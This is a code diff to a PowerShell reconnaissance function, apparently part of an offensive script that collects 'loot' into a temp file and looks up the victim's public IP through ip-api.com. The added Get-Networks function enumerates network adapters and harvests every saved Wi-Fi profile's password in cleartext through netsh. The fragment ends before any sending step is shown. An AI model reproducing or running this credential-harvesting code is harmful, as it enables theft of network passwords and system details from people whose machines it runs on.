@@ -1,6 +1,35 @@
 function Get-Recon {
     $ipInfoApiUrl = "http://ip-api.com/json"
     $outputFile = "$env:TEMP\CaliLoot.txt"
+	
+	Function Get-Networks {
+$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+
+$WLANProfileNames =@()
+
+$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
+
+Foreach($WLANProfileName in $Output){
+    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
+}
+$WLANProfileObjects =@()
+
+Foreach($WLANProfileName in $WLANProfileNames){
+
+    try{
+        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
+    }Catch{
+        $WLANProfilePassword = "The password is not stored in this profile"
+    }
+
+    $WLANProfileObject = New-Object PSCustomobject 
+    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
+    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
+    $WLANProfileObjects += $WLANProfileObject
+    Remove-Variable WLANProfileObject    
+}
+return $WLANProfileObjects
+}
 
     try {
         $response = Invoke-RestMethod -Uri $ipInfoApiUrl -Method Get
